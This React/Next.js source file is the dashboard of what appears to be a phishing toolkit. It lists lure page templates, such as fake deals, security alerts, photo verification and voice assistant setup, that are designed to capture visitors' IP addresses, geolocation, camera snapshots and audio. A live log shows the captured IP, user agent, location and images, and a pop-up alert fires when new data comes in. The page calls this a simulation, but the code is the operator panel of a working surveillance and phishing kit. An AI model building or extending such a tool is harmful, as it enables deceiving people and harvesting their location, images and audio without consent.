
"use client";
import { useEffect, useRef } from 'react';
import { useLogs } from '@/contexts/LogContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle } from 'lucide-react';
import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
import { ScrollArea } from '@/components/ui/scroll-area';
import Image from 'next/image';
import { useToast } from '@/hooks/use-toast';


const phishingCategories = [
  {
    title: 'Location',
    description: 'Templates designed to capture IP address and attempt geolocation.',
    Icon: MapPin,
    links: [
      { id: 'nearby-deals', name: 'Template: Nearby Deals', url: '/phishing/location/nearby-deals' },
      { id: 'security-alert', name: 'Template: Security Alert', url: '/phishing/location/security-alert' },
      { id: 'content-unlock', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock' },
    ],
    cardColorClass: "bg-blue-50 border-blue-200",
  },
  {
    title: 'Camera Access',
    description: 'Templates attempting to access the device camera.',
    Icon: Camera,
    links: [
      { id: 'cam1', name: 'Template: Profile Photo Update', url: '/phishing/camera/profile-photo' },
      { id: 'cam2', name: 'Template: Video Verification', url: '/phishing/camera/video-verification' },
      { id: 'cam3', name: 'Template: AR Filter Test', url: '/phishing/camera/ar-filter' },
    ],
    cardColorClass: "bg-green-50 border-green-200",
  },
  {
    title: 'Audio Access',
    description: 'Templates simulating microphone access requests.',
    Icon: Mic,
    links: [
      { id: 'aud1', name: 'Template: Voice Assistant Setup', url: '/phishing/audio/voice-assistant' },
      { id: 'aud2', name: 'Template: Speech-to-Text Demo', url: '/phishing/audio/speech-to-text' },
      { id: 'aud3', name: 'Template: Audio Quality Check', url: '/phishing/audio/quality-check' },
    ],
    cardColorClass: "bg-purple-50 border-purple-200",
  },
];

export default function DashboardPage() {
  const { logs, clearLogs, isLoading } = useLogs();
  const { toast } = useToast();
  const previousLatestLogIdRef = useRef<string | null>(null);
  const isInitialLoadRef = useRef(true);

  useEffect(() => {
    if (isLoading) return; 

    if (logs.length === 0) {
      previousLatestLogIdRef.current = null; 
      if(isInitialLoadRef.current) isInitialLoadRef.current = false;
      return;
    }

    const currentLatestLogId = logs[0].id;

    if (isInitialLoadRef.current) {
      previousLatestLogIdRef.current = currentLatestLogId;
      isInitialLoadRef.current = false;
      return; 
    }

    if (currentLatestLogId !== previousLatestLogIdRef.current) {
      const newLog = logs[0];
      let toastTitle = "New Data Captured!";
      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;

      if (newLog.type === 'location') {
        const locData = newLog.data as LocationData;
        const city = locData.city || "Unknown City";
        const country = locData.country || "Unknown Country";
        toastTitle = "Location Data Captured!";
        toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;
      } else if (newLog.type === 'camera') {
        toastTitle = "Camera Snapshot Captured!";
        toastDescription = `Image captured from IP: ${newLog.ip}.`;
      } else if (newLog.type === 'audio') {
        toastTitle = "Audio Capture Simulated!";
        toastDescription = `Audio event from IP: ${newLog.ip}.`;
      } else if (newLog.type === 'generic') {
        toastTitle = "Page Visit Detected!";
        toastDescription = `Page: ${newLog.data.message?.split(': ')[1] || 'Unknown page'}, IP: ${newLog.ip}`;
      }
      
      toast({
        title: toastTitle,
        description: toastDescription,
        variant: "default",
      });
      previousLatestLogIdRef.current = currentLatestLogId;
    }
  }, [logs, isLoading, toast]);


  const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {
    if (type === 'camera' && data && typeof data.imageUrl === 'string') {
      const camData = data as CameraData;
      return (
        <div className="mt-2">
          <Image 
            src={camData.imageUrl} 
            alt="Captured image" 
            width={160} 
            height={120} 
            className="rounded-md border object-contain" 
          />
          <details className="text-xs mt-1">
            <summary className="cursor-pointer text-muted-foreground hover:text-foreground">Show Base64 Data</summary>
            <pre className="whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1">{JSON.stringify({ imageUrl: "Data URL too long to display here directly, see raw log." }, null, 2)}</pre>
          </details>
        </div>
      );
    }
    if (type === 'location' && data) {
        const locData = data as LocationData;
        return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(locData, null, 2)}</pre>;
    }
    return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data, null, 2)}</pre>;
  };

  return (
    <div className="space-y-8">
      <Card className="shadow-lg">
        <CardHeader>
          <CardTitle className="text-2xl flex items-center">
            <ListChecks className="mr-3 h-7 w-7 text-primary" />
            Captured Data Logs
          </CardTitle>
          <CardDescription>
            View all data captured from phishing page interactions. This data updates in real-time.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {isLoading ? (
            <p>Loading logs...</p>
          ) : logs.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground">
              <AlertTriangle className="mx-auto h-12 w-12 mb-2" />
              <p className="text-lg">No logs captured yet.</p>
              <p>Interact with the phishing templates to see data here.</p>
            </div>
          ) : (
            <ScrollArea className="h-[400px] w-full rounded-md border p-4 bg-secondary/30">
              {logs.map(log => (
                <div key={log.id} className="mb-4 p-3 rounded-md bg-card shadow-sm border">
                  <p className="font-semibold text-sm text-primary">Log ID: <span className="font-mono text-xs">{log.id}</span></p>
                  <p className="text-xs text-muted-foreground">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>
                  <p className="text-xs text-muted-foreground">Type: <span className="font-medium capitalize">{log.type}</span></p>
                  <p className="text-xs text-muted-foreground">IP: {log.ip}</p>
                  <p className="text-xs text-muted-foreground">User Agent: {log.userAgent}</p>
                  <div className="mt-1 text-sm">Data: {formatLogData(log.data, log.type)}</div>
                </div>
              ))}
            </ScrollArea>
          )}
          <Button onClick={clearLogs} variant="destructive" disabled={logs.length === 0}>
            <Trash2 className="mr-2 h-4 w-4" /> Delete All Logs
          </Button>
        </CardContent>
      </Card>

      <Card className="shadow-lg">
        <CardHeader>
          <CardTitle className="text-2xl">Phishing Page Templates</CardTitle>
          <CardDescription>
            Use these links to simulate phishing attempts and observe data capture. Each link opens in a new tab.
          </CardDescription>
        </CardHeader>
        <CardContent className="grid gap-6 md:grid-cols-1 lg:grid-cols-3">
          {phishingCategories.map((category) => (
            <PhishingLinkCard
              key={category.title}
              title={category.title}
              description={category.description}
              Icon={category.Icon}
              links={category.links}
              cardColorClass={category.cardColorClass}
            />
          ))}
        </CardContent>
      </Card>
    </div>
  );
}
